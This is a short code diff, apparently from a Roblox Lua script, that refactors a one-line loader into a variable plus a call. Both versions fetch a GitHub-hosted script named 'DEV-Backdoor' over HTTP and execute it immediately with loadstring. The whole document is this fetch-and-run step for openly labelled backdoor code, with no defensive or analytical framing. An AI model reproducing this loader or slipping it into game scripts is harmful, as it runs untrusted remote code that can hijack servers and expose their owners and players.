@@ -1,1 +1,2 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/arfavirendra1230-droid/Scripts/refs/heads/main/DEV-Backdoor"))()
+local mainlink = "https://raw.githubusercontent.com/arfavirendra1230-droid/Scripts/refs/heads/main/DEV-Backdoor"
+loadstring(game:HttpGet(mainlink))()
